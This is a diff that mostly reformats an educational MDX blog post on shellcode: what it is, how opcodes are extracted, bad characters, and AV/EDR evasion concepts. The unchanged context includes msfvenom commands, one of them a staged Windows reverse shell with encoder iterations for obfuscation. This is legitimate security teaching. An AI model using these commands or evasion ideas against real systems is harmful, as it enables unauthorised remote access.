@@ -21,7 +21,7 @@ readTime: "14 min"
 url: "https://asbawy.github.io/logs/shellcode101"
 ---
 
-import { Callout } from '@/components/Callout'
+import { Callout } from "@/components/Callout";
 
 ## Intro
 
@@ -30,6 +30,7 @@ Picture a tiny, folded note. Slip it to the right person, and they execute its i
 Shellcode is a small, self-contained chunk of machine code acting as the **payload** in a cyberattack. Operating without a compiler or runtime, it must be written in raw Assembly to run directly inside a vulnerable process. Tiny. Direct. Surgical.
 
 The attacker's workflow is simple:
+
 1. **Find a vulnerability** to crack the target's logic.
 2. **Inject the shellcode** into the program's memory.
 3. **Redirect execution** to force the CPU to run your instructions instead of its own.
@@ -40,7 +41,7 @@ The attacker's workflow is simple:
 
 ## What is a Shellcode ?
 
-Before writing shellcode, you need a clear target: *what should it do?* The most iconic goal in exploit development is **popping a shell** — spawning an interactive `/bin/sh` on the target.
+Before writing shellcode, you need a clear target: _what should it do?_ The most iconic goal in exploit development is **popping a shell** — spawning an interactive `/bin/sh` on the target.
 
 Here is the simplest possible version of that goal, expressed in C:
 
@@ -65,7 +66,7 @@ Here is the critical detail that makes this dangerous: **if the target program w
 
 The problem? You cannot inject C source code into a buffer overflow. The target program does not have a compiler. It only understands **machine code** — the raw bytes the CPU reads directly. That C program must first become opcodes.
 
-But before we can inject anything, we need something to inject *into*. We need a vulnerability.
+But before we can inject anything, we need something to inject _into_. We need a vulnerability.
 
 ---
 
@@ -110,7 +111,7 @@ This is the fundamental mechanic that transforms a crash into a full remote code
 
 ## From C to Assembly: Extracting the Opcodes
 
-Now we understand *why* shellcode needs to be machine code, and *how* it gets delivered. Let us look at *what* that machine code actually looks like.
+Now we understand _why_ shellcode needs to be machine code, and _how_ it gets delivered. Let us look at _what_ that machine code actually looks like.
 
 We use a **disassembler** to peer inside a compiled binary and read the raw instructions the CPU will execute. Tools of the trade include **IDA Pro**, **Ghidra** (free, from the NSA), **Binary Ninja**, and **OllyDbg**. Compiling and disassembling our `spawn_shell.c` on macOS/x64 yields something like the following:
 
@@ -151,11 +152,11 @@ _main:
 
 Three columns, three jobs:
 
-| Column | Example | Meaning |
-|--------|---------|---------|
-| **Address** | `0000000100000f10` | Where this instruction lives in memory. |
-| **Opcodes** | `55`, `48 89 e5` | The **raw bytes** the CPU actually reads. |
-| **Mnemonic** | `pushq %rbp` | Human-readable translation of those bytes. |
+| Column       | Example            | Meaning                                    |
+| ------------ | ------------------ | ------------------------------------------ |
+| **Address**  | `0000000100000f10` | Where this instruction lives in memory.    |
+| **Opcodes**  | `55`, `48 89 e5`   | The **raw bytes** the CPU actually reads.  |
+| **Mnemonic** | `pushq %rbp`       | Human-readable translation of those bytes. |
 
 The opcodes are what we care about. Once we have them, we concatenate the hex bytes and prepend each with `\x` to produce a C-style byte string — the format most exploit code uses:
 
@@ -192,16 +193,18 @@ This is one of the most common reasons beginner shellcode "works on paper" but f
 
 **Bad characters** are any bytes that cause the target application to corrupt, truncate, or mishandle our payload before the CPU ever sees it. Null bytes are the most universal offender, but the full list is target-dependent:
 
-| Byte | Value | Common Reason It Breaks Payloads |
-|------|-------|----------------------------------|
-| `\x00` | Null | String terminator in `strcpy`, `strlen`, etc. |
-| `\x0a` | `LF` | Newline — terminates input in console and HTTP contexts. |
-| `\x0d` | `CR` | Carriage return — terminates input in many network protocols. |
-| `\x20` | Space | Delimiter in command-line argument parsers. |
+| Byte   | Value  | Common Reason It Breaks Payloads                                  |
+| ------ | ------ | ----------------------------------------------------------------- |
+| `\x00` | Null   | String terminator in `strcpy`, `strlen`, etc.                     |
+| `\x0a` | `LF`   | Newline — terminates input in console and HTTP contexts.          |
+| `\x0d` | `CR`   | Carriage return — terminates input in many network protocols.     |
+| `\x20` | Space  | Delimiter in command-line argument parsers.                       |
 | Varies | Custom | Application-specific filters on non-printable bytes, ranges, etc. |
 
 <Callout type="warning">
-**The Golden Rule of Shellcode:** Always identify bad characters *for your specific target* before finalizing your payload. A byte that is harmless in one context can silently detonate your exploit in another. Test your full payload byte-by-byte against the actual injection point — never assume.
+  **The Golden Rule of Shellcode:** Always identify bad characters *for your specific target* before
+  finalizing your payload. A byte that is harmless in one context can silently detonate your exploit
+  in another. Test your full payload byte-by-byte against the actual injection point — never assume.
 </Callout>
 
 ### Techniques for Avoiding Null Bytes
@@ -219,7 +222,7 @@ Mastering these tricks is what separates hand-crafted shellcode from anything a 
 
 ## Generating Shellcode with MSFvenom
 
-Writing null-byte-free assembly by hand is the right way to *learn*. It is rarely the right way to *operate* under time pressure in a CTF or an authorized engagement. That is where **MSFvenom** earns its keep.
+Writing null-byte-free assembly by hand is the right way to _learn_. It is rarely the right way to _operate_ under time pressure in a CTF or an authorized engagement. That is where **MSFvenom** earns its keep.
 
 MSFvenom is the payload generator bundled with the Metasploit Framework. It handles bad-character encoding, multiple output formats, architecture targeting, and even multi-iteration encoding passes — all from a single command.
 
@@ -233,16 +236,16 @@ msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00'
 
 **Flag breakdown:**
 
-| Flag | Meaning |
-|------|---------|
-| `-p windows/x64/exec` | Payload: run an arbitrary command on 64-bit Windows. |
-| `CMD=calc.exe` | The command to execute. |
-| `-f c` | Output format: C-style byte string (`\x90\x90...`). |
-| `-b '\x00'` | Bad character list: encode the payload to exclude null bytes. |
+| Flag                  | Meaning                                                       |
+| --------------------- | ------------------------------------------------------------- |
+| `-p windows/x64/exec` | Payload: run an arbitrary command on 64-bit Windows.          |
+| `CMD=calc.exe`        | The command to execute.                                       |
+| `-f c`                | Output format: C-style byte string (`\x90\x90...`).           |
+| `-b '\x00'`           | Bad character list: encode the payload to exclude null bytes. |
 
 ### CTF Classic: Staged Reverse Shell
 
-In penetration tests and CTF challenges with network interaction, the goal is often a **reverse shell** — the victim machine connects *back* to your listener, bypassing firewall rules that might block inbound connections.
+In penetration tests and CTF challenges with network interaction, the goal is often a **reverse shell** — the victim machine connects _back_ to your listener, bypassing firewall rules that might block inbound connections.
 
 ```bash title="msfvenom_revshell.sh"
 msfvenom -p windows/x64/shell_reverse_tcp \
@@ -256,12 +259,12 @@ msfvenom -p windows/x64/shell_reverse_tcp \
 
 **Additional flags explained:**
 
-| Flag | Meaning |
-|------|---------|
-| `LHOST` / `LPORT` | Your attacker IP and the port your listener is on. |
-| `-b '\x00\x0a\x0d'` | Exclude null, newline, and carriage return bytes. |
-| `-e x64/xor` | Apply the `x64/xor` encoder to scramble the payload bytes. |
-| `-i 3` | Run the encoder through **3 iterations** for deeper obfuscation. |
+| Flag                | Meaning                                                          |
+| ------------------- | ---------------------------------------------------------------- |
+| `LHOST` / `LPORT`   | Your attacker IP and the port your listener is on.               |
+| `-b '\x00\x0a\x0d'` | Exclude null, newline, and carriage return bytes.                |
+| `-e x64/xor`        | Apply the `x64/xor` encoder to scramble the payload bytes.       |
+| `-i 3`              | Run the encoder through **3 iterations** for deeper obfuscation. |
 
 MSFvenom outputs a ready-to-paste C array. Drop it into your exploit script or custom loader and you are off to the races.
 
@@ -269,7 +272,7 @@ MSFvenom outputs a ready-to-paste C array. Drop it into your exploit script or c
 
 ## Evasion Concepts: Why Raw Shellcode Gets Caught
 
-Take the payload above and drop it onto a modern Windows machine running **Windows Defender** or a commercial EDR. It will almost certainly be flagged — not because the AV *knows* your specific bytes, but because raw Metasploit shellcode carries **signatures**: byte patterns that have appeared in thousands of publicly documented exploits. Defenders have entire databases of them.
+Take the payload above and drop it onto a modern Windows machine running **Windows Defender** or a commercial EDR. It will almost certainly be flagged — not because the AV _knows_ your specific bytes, but because raw Metasploit shellcode carries **signatures**: byte patterns that have appeared in thousands of publicly documented exploits. Defenders have entire databases of them.
 
 ### How Detection Works
 
@@ -284,7 +287,11 @@ Each layer catches different things. Evading all of them simultaneously is the r
 ### The Shift in Mindset: Execution Over Payload
 
 <Callout type="info">
-**Pro Tip — The Letter Analogy:** If you hand a security guard a suspicious letter, they inspect the letter. But if you teach someone how to *deliver* any letter without being seen, the contents become almost irrelevant. In shellcode terms: **it is not about making the payload invisible. It is about making the *act of execution* invisible.** The best Red Teamers obsess over their delivery mechanism, not their payload bytes.
+  **Pro Tip — The Letter Analogy:** If you hand a security guard a suspicious letter, they inspect
+  the letter. But if you teach someone how to *deliver* any letter without being seen, the contents
+  become almost irrelevant. In shellcode terms: **it is not about making the payload invisible. It
+  is about making the *act of execution* invisible.** The best Red Teamers obsess over their
+  delivery mechanism, not their payload bytes.
 </Callout>
 
 ### Evasion Techniques — A Theoretical Overview
